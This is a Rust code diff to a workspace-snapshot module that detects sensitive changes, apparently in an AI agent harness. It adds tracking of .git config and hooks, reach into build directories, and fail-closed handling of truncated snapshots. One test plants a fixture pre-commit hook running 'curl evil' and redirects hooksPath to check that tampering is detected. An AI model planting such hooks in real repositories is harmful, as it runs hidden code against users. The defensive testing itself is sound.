@@ -2,8 +2,8 @@
 //! of the task, and a metadata snapshot of the workspace before and after the first turn.
 //! No file contents and no `git`: a snapshot is file paths, lengths and modification times.
 
-use std::collections::{BTreeMap, BTreeSet};
-use std::path::Path;
+use std::collections::{BTreeMap, BTreeSet, VecDeque};
+use std::path::{Path, PathBuf};
 
 use adk_harness::approvals::matcher::{glob_matches, is_protected_path};
 use serde::{Deserialize, Serialize};
@@ -20,9 +20,14 @@ pub const SNAPSHOT_MAX_FILES: usize = 20_000;
 /// Most changed paths [`ChangeSignals`] lists; the digest covers all of them.
 const MAX_LISTED_PATHS: usize = 64;
 
-/// Directories a snapshot never enters: build output, dependencies and VCS internals.
+/// Directories a snapshot enters only when a `sensitive_paths` glob names them from the
+/// workspace root: build output and dependencies.
 const SKIPPED_DIRS: &[&str] =
-    &[".git", "target", "node_modules", ".venv", "venv", "dist", "build", "__pycache__", ".next"];
+    &["target", "node_modules", ".venv", "venv", "dist", "build", "__pycache__", ".next"];
+
+/// The entries of a `.git` directory a snapshot records: what decides which code runs
+/// (configuration, hooks, excludes and attributes), not objects, refs or logs.
+const GIT_RECORDED: &[&str] = &["config", "config.worktree", "hooks", "info"];
 
 /// The manifests that mark a package root.
 const MANIFESTS: &[&str] = &["Cargo.toml", "package.json", "pyproject.toml", "go.mod"];
@@ -206,9 +211,11 @@ pub struct FileStamp {
 }
 
 /// A metadata snapshot of a workspace (spec 3.1 §7.10): every file path, relative and with
-/// `/` separators, with its length and modification time. The walk follows no symlink (a
-/// symlink is recorded as itself), skips build output, dependencies and `.git` but not
-/// `.github` or `.adk`, stops at [`SNAPSHOT_MAX_FILES`], and starts no process.
+/// `/` separators, with its length and modification time. The walk is breadth-first, follows
+/// no symlink (a symlink is recorded as itself), records only `config`, `config.worktree`,
+/// `hooks/` and `info/` of a `.git` directory, skips build output and dependencies (`target`,
+/// `node_modules`, `dist`, `build`, …) unless a `sensitive_paths` glob names them from the
+/// workspace root, stops at [`SNAPSHOT_MAX_FILES`], and starts no process.
 ///
 /// # Example
 ///
@@ -233,22 +240,62 @@ pub struct WorkspaceSnapshot {
 impl WorkspaceSnapshot {
     /// Captures `root`.
     pub fn capture(root: &Path) -> Self {
+        Self::capture_with(root, &[])
+    }
+
+    /// Captures `root`, also entering the skipped directories that a glob of
+    /// `sensitive_paths` names from the workspace root before its first wildcard: `dist/**`
+    /// enters `dist`, `**/dist/**` does not (spec 3.1 §7.10).
+    ///
+    /// # Example
+    ///
+    /// ```rust
+    /// use adk_cli::harness::ultracode::WorkspaceSnapshot;
+    ///
+    /// let dir = tempfile::tempdir().unwrap();
+    /// std::fs::create_dir(dir.path().join("dist")).unwrap();
+    /// std::fs::write(dir.path().join("dist/index.js"), "run()").unwrap();
+    /// assert!(WorkspaceSnapshot::capture(dir.path()).files.is_empty());
+    /// let snapshot = WorkspaceSnapshot::capture_with(dir.path(), &["dist/**".to_string()]);
+    /// assert!(snapshot.files.contains_key("dist/index.js"));
+    /// ```
+    pub fn capture_with(root: &Path, sensitive_paths: &[String]) -> Self {
+        let reach: Vec<String> = sensitive_paths.iter().map(|glob| literal_prefix(glob)).collect();
+        let reached = |relative: &str| {
+            reach.iter().any(|prefix| {
+                !prefix.is_empty()
+                    && (prefix == relative
+                        || prefix.strip_prefix(relative).is_some_and(|rest| rest.starts_with('/'))
+                        || relative
+                            .strip_prefix(prefix.as_str())
+                            .is_some_and(|rest| rest.starts_with('/')))
+            })
+        };
         let mut snapshot = Self::default();
-        let mut pending = vec![root.to_path_buf()];
-        while let Some(dir) = pending.pop() {
+        // Breadth-first, so a large tree deep down cannot hide the files near the root.
+        let mut pending: VecDeque<(PathBuf, bool)> = VecDeque::from([(root.to_path_buf(), false)]);
+        while let Some((dir, git)) = pending.pop_front() {
             let Ok(entries) = std::fs::read_dir(&dir) else {
                 continue;
             };
             let mut entries: Vec<_> = entries.flatten().collect();
             entries.sort_by_key(std::fs::DirEntry::file_name);
             for entry in entries {
+                let name = entry.file_name().to_string_lossy().into_owned();
+                if git && !GIT_RECORDED.contains(&name.as_str()) {
+                    continue;
+                }
                 let Ok(metadata) = entry.path().symlink_metadata() else {
                     continue;
                 };
-                let name = entry.file_name().to_string_lossy().into_owned();
+                let Some(relative) = relative_path(root, &entry.path()) else {
+                    continue;
+                };
                 if metadata.is_dir() {
-                    if !SKIPPED_DIRS.contains(&name.as_str()) {
-                        pending.push(entry.path());
+                    if name == ".git" {
+                        pending.push_back((entry.path(), true));
+                    } else if !SKIPPED_DIRS.contains(&name.as_str()) || reached(&relative) {
+                        pending.push_back((entry.path(), false));
                     }
                     continue;
                 }
@@ -256,14 +303,6 @@ impl WorkspaceSnapshot {
                     snapshot.truncated = true;
                     return snapshot;
                 }
-                let Ok(relative) = entry.path().strip_prefix(root).map(Path::to_path_buf) else {
-                    continue;
-                };
-                let relative = relative
-                    .components()
-                    .map(|part| part.as_os_str().to_string_lossy().into_owned())
-                    .collect::<Vec<_>>()
-                    .join("/");
                 let mtime_ns = metadata
                     .modified()
                     .ok()
@@ -278,6 +317,43 @@ impl WorkspaceSnapshot {
     /// What changed from this snapshot to `after`: added, removed and modified files, with
     /// the protected (spec 3.1 §9.2 I29), security-vocabulary and `sensitive_paths` matches.
     pub fn diff(&self, after: &WorkspaceSnapshot, sensitive_paths: &[String]) -> ChangeSignals {
+        self.diff_globs(after, sensitive_paths, &[])
+    }
+
+    /// [`diff`](Self::diff) under `limits`: the matches of the operator's `sensitive_paths`
+    /// (user config) and, apart, of the workspace's own (`.adk/harness.toml`), which add the
+    /// `security` seat but never choose the board (spec 3.1 §7.10).
+    ///
+    /// # Example
+    ///
+    /// ```rust
+    /// use adk_cli::harness::ultracode::{UltracodeLimits, WorkspaceSnapshot};
+    ///
+    /// let dir = tempfile::tempdir().unwrap();
+    /// let before = WorkspaceSnapshot::capture(dir.path());
+    /// std::fs::write(dir.path().join("schema.sql"), "create table t ();").unwrap();
+    /// let limits = UltracodeLimits {
+    ///     workspace_sensitive_paths: vec!["*.sql".into()],
+    ///     ..UltracodeLimits::default()
+    /// };
+    /// let change = before.diff_with(&WorkspaceSnapshot::capture(dir.path()), &limits);
+    /// assert_eq!(change.workspace_sensitive_matched, ["schema.sql"]);
+    /// assert!(change.is_sensitive() && !change.sensitive_rule_applies());
+    /// ```
+    pub fn diff_with(
+        &self,
+        after: &WorkspaceSnapshot,
+        limits: &super::config::UltracodeLimits,
+    ) -> ChangeSignals {
+        self.diff_globs(after, &limits.sensitive_paths, &limits.workspace_sensitive_paths)
+    }
+
+    fn diff_globs(
+        &self,
+        after: &WorkspaceSnapshot,
+        sensitive_paths: &[String],
+        workspace_paths: &[String],
+    ) -> ChangeSignals {
         let changed: Vec<&String> = self
             .files
             .keys()
@@ -312,9 +388,52 @@ impl WorkspaceSnapshot {
             sensitive_matched: listed(&|path| {
                 sensitive_paths.iter().any(|pattern| glob_matches(pattern, path))
             }),
+            workspace_sensitive_matched: listed(&|path| {
+                workspace_paths.iter().any(|pattern| glob_matches(pattern, path))
+            }),
             truncated: self.truncated || after.truncated,
         }
     }
+}
+
+/// `path` relative to `root`, with `/` separators.
+fn relative_path(root: &Path, path: &Path) -> Option<String> {
+    let relative = path.strip_prefix(root).ok()?;
+    Some(
+        relative
+            .components()
+            .map(|part| part.as_os_str().to_string_lossy().into_owned())
+            .collect::<Vec<_>>()
+            .join("/"),
+    )
+}
+
+/// The path a glob names before its first wildcard component: `dist/**` gives `dist`.
+fn literal_prefix(glob: &str) -> String {
+    glob.split('/')
+        .filter(|part| !part.is_empty() && *part != ".")
+        .take_while(|part| !part.contains(['*', '?']))
+        .collect::<Vec<_>>()
+        .join("/")
+}
+
+/// A note for each `sensitive_paths` glob that names a directory the snapshot skips past
+/// its first wildcard, such as `**/dist/**`: no change below that directory is seen.
+pub(crate) fn unreachable_glob_notes(origin: &str, globs: &[String]) -> Vec<String> {
+    globs
+        .iter()
+        .filter_map(|glob| {
+            let wild = glob.split('/').skip_while(|part| !part.contains(['*', '?']));
+            let skipped = wild
+                .filter(|part| !part.contains(['*', '?']))
+                .find(|part| SKIPPED_DIRS.contains(part))?;
+            Some(format!(
+                "{origin}: [ultracode] sensitive_paths glob `{glob}` points into `{skipped}`, \
+                 which the change snapshot does not enter; name it from the workspace root, \
+                 such as `{skipped}/**`, for its changes to count"
+            ))
+        })
+        .collect()
 }
 
 /// Whether a component of `path` is in the security vocabulary, ignoring case and a file
@@ -399,19 +518,33 @@ pub struct ChangeSignals {
     pub protected: Vec<String>,
     /// Changed paths with a security-vocabulary component.
     pub security: Vec<String>,
-    /// Changed paths matching the operator's `sensitive_paths` globs.
+    /// Changed paths matching the operator's `sensitive_paths` globs (user config).
     pub sensitive_matched: Vec<String>,
-    /// Whether either snapshot stopped at the file cap.
+    /// Changed paths matching the workspace's own `sensitive_paths` globs
+    /// (`.adk/harness.toml`).
+    #[serde(default)]
+    pub workspace_sensitive_matched: Vec<String>,
+    /// Whether either snapshot stopped at the file cap, so part of the change is unseen.
     pub truncated: bool,
 }
 
 impl ChangeSignals {
-    /// Whether the change is sensitive: a protected path, a security-vocabulary component,
-    /// or a `sensitive_paths` match.
+    /// Whether the change is sensitive, which adds the `security` seat: a protected path, a
+    /// security-vocabulary component, a `sensitive_paths` match of either config file, or a
+    /// snapshot that stopped at its cap (fail closed).
     pub fn is_sensitive(&self) -> bool {
-        !(self.protected.is_empty()
-            && self.security.is_empty()
-            && self.sensitive_matched.is_empty())
+        self.sensitive_rule_applies() || !self.workspace_sensitive_matched.is_empty()
+    }
+
+    /// Whether rule `sensitive` routes the review to the board (spec 3.1 §7.10): a protected
+    /// path, a security-vocabulary component, a match of the operator's `sensitive_paths`,
+    /// or a snapshot that stopped at its cap. A match of the workspace's own globs only adds
+    /// the `security` seat: a workspace may not choose the board.
+    pub fn sensitive_rule_applies(&self) -> bool {
+        self.truncated
+            || !(self.protected.is_empty()
+                && self.security.is_empty()
+                && self.sensitive_matched.is_empty())
     }
 }
 
@@ -559,6 +692,76 @@ mod tests {
         std::os::unix::fs::symlink(outside.path(), dir.path().join("link")).unwrap();
         let snapshot = WorkspaceSnapshot::capture(dir.path());
         assert_eq!(snapshot.files.keys().collect::<Vec<_>>(), ["link"]);
+    }
+
+    #[test]
+    fn the_snapshot_sees_git_config_and_hooks_but_not_objects() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        for path in [".git/config", ".git/HEAD", ".git/objects/ab/cdef", ".git/refs/heads/main"] {
+            std::fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
+            std::fs::write(root.join(path), "x").unwrap();
+        }
+        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
+        let before = WorkspaceSnapshot::capture(root);
+        assert_eq!(before.files.keys().collect::<Vec<_>>(), [".git/config"]);
+
+        // `git config core.hooksPath .hooks`, a planted hook, and ordinary git activity.
+        std::fs::write(root.join(".git/config"), "[core]\n\thooksPath = .hooks\n").unwrap();
+        std::fs::write(root.join(".git/hooks/pre-commit"), "#!/bin/sh\ncurl evil").unwrap();
+        std::fs::write(root.join(".git/objects/ab/0123"), "blob").unwrap();
+        std::fs::write(root.join(".git/HEAD"), "ref: refs/heads/other").unwrap();
+        let change = before.diff(&WorkspaceSnapshot::capture(root), &[]);
+        assert_eq!(change.changed_paths, [".git/config", ".git/hooks/pre-commit"]);
+        assert_eq!(change.protected, change.changed_paths);
+        assert!(change.sensitive_rule_applies());
+    }
+
+    #[test]
+    fn sensitive_globs_reach_skipped_directories() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        for path in ["dist/index.js", "pkg/web/build/app.js", "node_modules/left-pad/index.js"] {
+            std::fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
+            std::fs::write(root.join(path), "v1").unwrap();
+        }
+        let globs: Vec<String> = vec!["dist/**".into(), "pkg/web/build/*".into()];
+        let before = WorkspaceSnapshot::capture_with(root, &globs);
+        for path in ["dist/index.js", "pkg/web/build/app.js", "node_modules/left-pad/index.js"] {
+            std::fs::write(root.join(path), "v2, longer").unwrap();
+        }
+        let change = before.diff(&WorkspaceSnapshot::capture_with(root, &globs), &globs);
+        assert_eq!(change.changed_paths, ["dist/index.js", "pkg/web/build/app.js"]);
+        assert_eq!(change.sensitive_matched, change.changed_paths);
+
+        let notes = unreachable_glob_notes(
+            "harness.toml",
+            &["**/dist/**".into(), "dist/**".into(), "*.lock".into(), "src/*/target/x".into()],
+        );
+        assert_eq!(notes.len(), 2, "{notes:?}");
+        assert!(notes[0].contains("`**/dist/**` points into `dist`"), "{notes:?}");
+        assert!(notes[1].contains("`src/*/target/x` points into `target`"), "{notes:?}");
+    }
+
+    #[test]
+    fn a_large_tree_cannot_hide_a_change_near_the_root() {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        std::fs::create_dir_all(root.join("src/auth")).unwrap();
+        std::fs::create_dir_all(root.join("vendor/lib")).unwrap();
+        for index in 0..SNAPSHOT_MAX_FILES {
+            std::fs::write(root.join(format!("vendor/lib/f{index}.go")), "").unwrap();
+        }
+        let before = WorkspaceSnapshot::capture(root);
+        std::fs::write(root.join("src/auth/token.go"), "package auth").unwrap();
+        let after = WorkspaceSnapshot::capture(root);
+        assert!(after.files.contains_key("src/auth/token.go"), "breadth-first: src before vendor");
+        let change = before.diff(&after, &[]);
+        assert!(change.truncated);
+        assert_eq!(change.security, ["src/auth/token.go"]);
+        // Whatever the cap hid, a truncated snapshot is sensitive (fail closed).
+        let hidden = ChangeSignals { truncated: true, ..ChangeSignals::default() };
+        assert!(hidden.is_sensitive() && hidden.sensitive_rule_applies());
     }
 
     #[test]
